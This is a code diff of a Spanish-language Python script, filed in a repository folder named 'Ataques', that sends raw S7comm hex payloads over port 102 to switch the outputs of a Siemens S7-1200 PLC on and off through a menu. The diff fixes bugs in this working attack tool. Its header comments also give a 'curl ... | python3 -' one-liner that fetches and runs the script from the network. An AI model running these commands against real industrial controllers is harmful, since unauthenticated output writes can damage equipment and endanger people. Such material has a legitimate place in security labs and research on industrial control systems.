@@ -15,13 +15,27 @@
 #   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/PLC-Siemens-S7-1200-1214c-Interactuar.py | nano -
 # ----------
 
+#!/usr/bin/env python3
+
+# Pongo a disposición pública este script bajo el término de "software de dominio público".
+# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
+# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
+# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.
+
+# ----------
+# Script de NiPeGun para interactuar con un PLC Siemens S7-1200, versión 1214c
+#
+# Ejecución remota (puede requerir permisos sudo):
+#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/PLC-Siemens-S7-1200-1214c-Interactuar.py | python3 -
+#
+# Bajar y editar directamente el archivo en nano:
+#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/PLC-Siemens-S7-1200-1214c-Interactuar.py | nano -
+# ----------
+
 import curses
 import time
 import socket
 import argparse
-
-
-vHost=''
 
 def fConectar(vHost):
   print(f"\n  Conectando a {vHost} en el puerto 102... \n")
@@ -114,6 +128,11 @@ def fEncenderSalida(vHost, salida, nombre):
     'Q0.10': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010100'
   }
 
+  if salida not in comandos:
+      print(f"\n  Salida {nombre} no definida. \n")
+      s.close()
+      return
+
   for cmd in [COTP_RQ, S7_COMM_RQ, comandos[salida]]:
     fEnviarPayload(cmd, s)
 
@@ -141,34 +160,34 @@ def fApagarSalida(vHost, salida, nombre):
     'Q0.10': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010000'
   }
 
+  if salida not in comandos:
+      print(f"\n  Salida {nombre} no definida. \n")
+      s.close()
+      return
+
   for cmd in [COTP_RQ, S7_COMM_RQ, comandos[salida]]:
     fEnviarPayload(cmd, s)
 
-  print(f"\n  Salida {nombre} activada correctamente. \n")
+  print(f"\n  Salida {nombre} desactivada correctamente. \n")
   s.close()
 
 def accion_opcion_1(stdscr):
   stdscr.clear()
-  # Aquí puedes colocar la serie de acciones que necesites para la opción 1
   stdscr.addstr(0, 0, "Ejecutando acción de la Opción 1...")
   stdscr.refresh()
-  # Simulamos una acción con una espera
   time.sleep(2)
 
 def accion_opcion_2(stdscr):
   stdscr.clear()
-  # Aquí puedes colocar las acciones correspondientes a la opción 2
   stdscr.addstr(0, 0, "Ejecutando acción de la Opción 2...")
   stdscr.refresh()
-  # Simulamos otra acción con una espera
   time.sleep(2)
 
-def main(stdscr):
+def main(stdscr, vHost):
   # Ocultamos el cursor y configuramos el par de colores para resaltar la opción seleccionada
   curses.curs_set(0)
   curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)
 
-  # Definimos las opciones del menú
   menu = [
     "Encender salida 0",
     "  Apagar salida 0",
@@ -212,58 +231,54 @@ def main(stdscr):
 
     key = stdscr.getch()
 
-    # Control de teclas para navegar
     if key == curses.KEY_UP and current_row > 0:
       current_row -= 1
     elif key == curses.KEY_DOWN and current_row < len(menu) - 1:
       current_row += 1
     elif key in [curses.KEY_ENTER, 10, 13]:
-      # Al presionar Enter, verificamos la opción seleccionada
       if menu[current_row] == "Salir":
         break
-      elif menu[current_row] == "Encendiendo salida 0":
-        fEncenderSalida('Q0.0')
-      elif menu[current_row] == "Apagando salida 0":
-        fApagarSalida('Q0.0')
-      elif menu[current_row] == "Encendiendo salida 1":
-        fEncenderSalida('Q0.1')
-      elif menu[current_row] == "Apagando salida 1":
-        fApagarSalida('Q0.1')
-      elif menu[current_row] == "Encendiendo salida 2":
-        fEncenderSalida('Q0.2')
-      elif menu[current_row] == "Apagando salida 2":
-        fApagarSalida('Q0.2')
-      elif menu[current_row] == "Encendiendo salida 3":
-        fEncenderSalida('Q0.3')
-      elif menu[current_row] == "Apagando salida 3":
-        fApagarSalida('Q0.3')
-      elif menu[current_row] == "Encendiendo salida 4":
-        fEncenderSalida('Q0.4')
-      elif menu[current_row] == "Apagando salida 4":
-        fApagarSalida('Q0.4')
-      elif menu[current_row] == "Encendiendo salida 5":
-        fEncenderSalida('Q0.5')
-      elif menu[current_row] == "Apagando salida 5":
-        fApagarSalida('Q0.5')
-      elif menu[current_row] == "Encendiendo salida 6":
-        fEncenderSalida('Q0.6')
-      elif menu[current_row] == "Apagando salida 6":
-        fApagarSalida('Q0.6')
-      elif menu[current_row] == "Encendiendo salida 7":
-        fEncenderSalida('Q0.7')
-      elif menu[current_row] == "Apagando salida 7":
-        fApagarSalida('Q0.7')
-      elif menu[current_row] == "Encendiendo salida 8":
-        fEncenderSalida('Q0.8')
-      elif menu[current_row] == "Apagando salida 8":
-        fApagarSalida('Q0.8')
-      elif menu[current_row] == "Encendiendo salida 9":
-        fEncenderSalida('Q0.9')
-      elif menu[current_row] == "Apagando salida 9":
-        fApagarSalida('Q0.9')
+      elif menu[current_row] == "Encender salida 0":
+        fEncenderSalida(vHost, 'Q0.0', 'Salida 0')
+      elif menu[current_row] == "  Apagar salida 0":
+        fApagarSalida(vHost, 'Q0.0', 'Salida 0')
+      elif menu[current_row] == "Encender salida 1":
+        fEncenderSalida(vHost, 'Q0.1', 'Salida 1')
+      elif menu[current_row] == "  Apagar salida 1":
+        fApagarSalida(vHost, 'Q0.1', 'Salida 1')
+      elif menu[current_row] == "Encender salida 2":
+        fEncenderSalida(vHost, 'Q0.2', 'Salida 2')
+      elif menu[current_row] == "  Apagar salida 2":
+        fApagarSalida(vHost, 'Q0.2', 'Salida 2')
+      elif menu[current_row] == "Encender salida 3":
+        fEncenderSalida(vHost, 'Q0.3', 'Salida 3')
+      elif menu[current_row] == "  Apagar salida 3":
+        fApagarSalida(vHost, 'Q0.3', 'Salida 3')
+      elif menu[current_row] == "Encender salida 4":
+        fEncenderSalida(vHost, 'Q0.4', 'Salida 4')
+      elif menu[current_row] == "  Apagar salida 4":
+        fApagarSalida(vHost, 'Q0.4', 'Salida 4')
+      elif menu[current_row] == "Encender salida 5":
+        fEncenderSalida(vHost, 'Q0.5', 'Salida 5')
+      elif menu[current_row] == "  Apagar salida 5":
+        fApagarSalida(vHost, 'Q0.5', 'Salida 5')
+      elif menu[current_row] == "Encender salida 6":
+        fEncenderSalida(vHost, 'Q0.6', 'Salida 6')
+      elif menu[current_row] == "  Apagar salida 6":
+        fApagarSalida(vHost, 'Q0.6', 'Salida 6')
+      elif menu[current_row] == "Encender salida 7":
+        fEncenderSalida(vHost, 'Q0.7', 'Salida 7')
+      elif menu[current_row] == "  Apagar salida 7":
+        fApagarSalida(vHost, 'Q0.7', 'Salida 7')
+      elif menu[current_row] == "Encender salida 8":
+        fEncenderSalida(vHost, 'Q0.8', 'Salida 8')
+      elif menu[current_row] == "  Apagar salida 8":
+        fApagarSalida(vHost, 'Q0.8', 'Salida 8')
+      elif menu[current_row] == "Encender salida 9":
+        fEncenderSalida(vHost, 'Q0.9', 'Salida 9')
+      elif menu[current_row] == "  Apagar salida 9":
+        fApagarSalida(vHost, 'Q0.9', 'Salida 9')
 
-
-  # Mensaje final antes de salir
   stdscr.clear()
   stdscr.addstr(0, 0, "Saliendo del programa...")
   stdscr.refresh()
@@ -272,5 +287,5 @@ if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='Control de PLC Siemens S7-1200')
   parser.add_argument('--host', required=True, help='\n Dirección IP del PLC \n')
   args = parser.parse_args()
-
-  curses.wrapper(main)
+  vHost = args.host
+  curses.wrapper(lambda stdscr: main(stdscr, vHost))
